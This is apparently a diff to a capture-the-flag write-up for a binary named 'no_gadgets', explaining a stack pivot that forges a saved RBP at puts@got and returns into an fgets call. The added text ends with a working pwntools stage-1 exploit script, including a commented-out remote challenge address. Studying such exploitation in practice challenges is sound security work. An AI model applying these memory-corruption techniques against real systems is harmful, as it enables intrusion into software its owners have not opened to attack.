@@ -71,7 +71,7 @@ pop rip        ; Pop the return address from the stack into the instruction poin
 15. The solution for this is to look for a memory location that can tolerate `0a00` at the end. Usually are `.bss` and  `GOT entry`.
 16. Two ways to identify it, are using ghidra or GDB.
 
-> IN GDB
+> GDB
 
 ![image](https://github.com/user-attachments/assets/d8596a2f-c0bd-4efa-b127-3473a3f7c772)
 
@@ -99,5 +99,54 @@ The opposite of private is shared (s).
 => Meaning multiple processes can read/write the same memory.
 ```
 
+20. Now we know that our forged RBP offset should be at `0x404000 + 0x80`, because if you remember the RBP is substract with 0x80. Hence to control the RBP we need to do + 0x80.
+21. With this, once `leave; ret;` executed, RSP shall pointed to our fake RBP.
 
+![image](https://github.com/user-attachments/assets/6adb5de3-0dc7-4e15-9c2f-aed3fd7866fd)
+
+21. Afterwards, before returning we need to add stack alignment then return to `fgets` gadget (so we can fill our fake RBP).
+22. Anyway as an additional information, our fake RBP starts at `puts@got`.
+
+![image](https://github.com/user-attachments/assets/2a67dc55-c71e-4a83-9c39-13b4036c0fc7)
+
+23. For the fgets gadget, I prefer to use offset `0x40121b` because there is where rdx is set to stdin and some registers are prepared before the actual call to `fgets@plt` (0x40122e).
+
+![image](https://github.com/user-attachments/assets/59089c15-afb3-4bb7-be26-d57b6b66182c)
+
+> STAGE 1 EXPLOIT SCRIPT
+
+```py
+from pwn import *
+import os
+
+os.system('clear')
+
+exe = './no_gadgets'
+elf = context.binary = ELF(exe, checksec=False)
+context.log_level = 'INFO'
+
+library = './libc.so.6'
+libc = context.binary = ELF(library, checksec=False)
+context.log_level = 'INFO'
+
+sh = process(exe)
+# sh = remote('94.237.50.242',55086)
+
+fgets_gadget = 0x40121b
+log.success(f'FGETS GADGET -> {hex(fgets_gadget)}')
+rop = ROP(elf)
+
+# [+] BYPASS STRLEN AND SET RSP TO FAKE SAVED RBP
+
+p = flat([
+    b'\x00', # bypass strlen
+    b'\x90' * 127, # pad to RBP
+    elf.got['puts']+0x80, # fake saved RBP (RSP start di puts@got)
+    rop.find_gadget(['ret']).address, # stack alignment
+    fgets_gadget # return to fgets call
+])
+
+sh.sendlineafter(b':', p)
+sh.interactive()
+```
 
